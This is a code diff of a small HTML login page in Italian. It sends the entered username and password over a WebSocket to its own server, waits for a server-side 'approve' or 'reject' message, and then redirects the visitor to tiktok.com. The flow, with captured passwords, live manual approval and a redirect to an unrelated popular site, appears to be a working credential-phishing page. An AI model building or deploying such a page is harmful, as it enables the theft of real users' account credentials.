@@ -4,71 +4,56 @@
   <meta charset="utf-8">
   <title>Login</title>
   <link rel="stylesheet" href="style.css">
-  <style>
-    body {
-      font-family: Arial;
-      background: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    #box {
-      background: white;
-      padding: 25px;
-      border-radius: 12px;
-      width: 300px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.15);
-      text-align: center;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #007bff;
-      border: none;
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-  </style>
 </head>
 <body>
+  <div id="box">
+    <h2>Accesso</h2>
+    <input id="user" placeholder="Username">
+    <input id="pass" placeholder="Password" type="password">
+    <button id="enter">INVIA</button>
+    <div id="status" style="margin-top:15px; min-height:20px;"></div>
+  </div>
 
-<div id="box">
-  <h2>Login</h2>
+  <script>
+    const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
+    let currentRequestId = null;
 
-  <input id="user" placeholder="Username">
-  <input id="pass" placeholder="Password" type="password">
+    ws.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      
+      if (data.type === 'approve') {
+        document.getElementById("status").innerHTML = 
+          `<span style="color:green">✅ Accesso approvato! Reindirizzamento...</span>`;
+        setTimeout(() => {
+          window.location.href = "https://www.tiktok.com";
+        }, 800);
+      } 
+      else if (data.type === 'reject') {
+        document.getElementById("status").innerHTML = 
+          `<span style="color:red">${data.message}</span>`;
+        document.getElementById("enter").disabled = false;
+      }
+    };
 
-  <button id="enter">ENTER</button>
-</div>
+    document.getElementById("enter").onclick = () => {
+      const user = document.getElementById("user").value.trim();
+      const pass = document.getElementById("pass").value.trim();
 
-<script>
-  const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
+      if (!pass) {
+        alert("Inserisci la password");
+        return;
+      }
 
-  document.getElementById("enter").onclick = () => {
-    const u = document.getElementById("user").value;
-    const p = document.getElementById("pass").value;
+      document.getElementById("status").innerHTML = 
+        `<span style="color:#888">⏳ In attesa di approvazione...</span>`;
+      document.getElementById("enter").disabled = true;
 
-    ws.send(JSON.stringify({
-      user: u,
-      message: p
-    }));
-
-    setTimeout(() => {
-      window.location.href = "https://www.tiktok.com";
-    }, 300);
-  };
-</script>
-
+      ws.send(JSON.stringify({
+        type: 'submit',
+        user: user,
+        message: pass
+      }));
+    };
+  </script>
 </body>
 </html>
